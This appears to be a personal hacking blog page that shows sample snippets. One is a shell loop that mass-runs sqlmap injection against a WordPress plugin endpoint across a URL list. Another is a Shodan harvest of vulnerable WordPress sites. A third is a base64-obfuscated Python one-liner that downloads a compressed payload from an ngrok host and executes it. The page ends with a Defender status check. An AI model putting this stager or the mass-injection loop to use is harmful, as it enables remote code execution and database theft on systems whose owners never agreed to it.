---
title: <span style="color:lime">Hacking Stuff</span>
permalink: /hackingstuff/
author_profile: false
categories:
  - Layout
  - Uncategorized
tags:
  - image
  - layout
sidebar:
  - title: "The Hacking Goodies"
    image: /assets/images/hackingstuff.png
    nav: sidebar-hackingstuff
toc: true
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true
---

## Introduction

This page contains most of the hacking stuff. On the left side, you can navigate to the different sections to explore the content.
Most of it is illustrated with command line snippets and output to make it easy to follow. Where applicable you can find other
references with links like this one [Google Hacking DB](https://www.exploit-db.com/google-hacking-database "Google Hacking Database") that you can explore to gain better understanding.
All these references can also be found at the [References Page](/references/ "References").

On right side of this page and other content pages, you will find table of contents that allows to navigate on the page itself. 

### Shell command line and script code snippet
```shell
while IFS= read -r url; 
  do sqlmap --url="$url/wp-content/plugins/superstorefinder-wp/ssf-social-action.php/" --data="action=select&ssf_wp_id=1" --random-agent --dbms="MySQL" --time-sec=10 --threads=5 --batch --dbs; 
done < url1.txt
```

### Command line output
```text
# shodan download --limit 500 wp-events-calendar 'http.component:"WordPress" http.component:"The Events Calendar"'
Search query:			http.component:"WordPress" http.component:"The Events Calendar"
Total number of results:	7253
Query credits left:		66
Output file:			wp-events-calendar.json.gz
  [###################################-]   99%  00:00:00
```

### Python code snippet
```python
exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHpsaWIsYmFzZTY0LHN5cwp2aT1zeXMudmVyc2lvbl9pbmZvCnVsPV9faW1wb3J0X18oezI6J3VybGxpYjInLDM6J3VybGxpYi5yZXF1ZXN0J31bdmlbMF1dLGZyb21saXN0PVsnYnVpbGRfb3BlbmVyJ10pCmhzPVtdCm89dWwuYnVpbGRfb3BlbmVyKCpocykKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoby5vcGVuKCdodHRwOi8vYzBtZTJkYWRkeS5ldS5uZ3Jvay5pbzo4MC9hYlZfV3Exd2VwVnV2M3VyRGtKS2FBWFNKeGM3ZkZUc0QtYmJPcWtJVHRFWmhVdWFMWGtQSkJsTUZoRzk2VjVscng1RVh6JykucmVhZCgpKSkpCg==')[0]))
```

### Powershell command line snippet

```powershell
PS C:\WINDOWS\system32> Get-service Windefend

Status   Name               DisplayName
------   ----               -----------
Running  Windefend          Microsoft Defender Antivirus Service

```
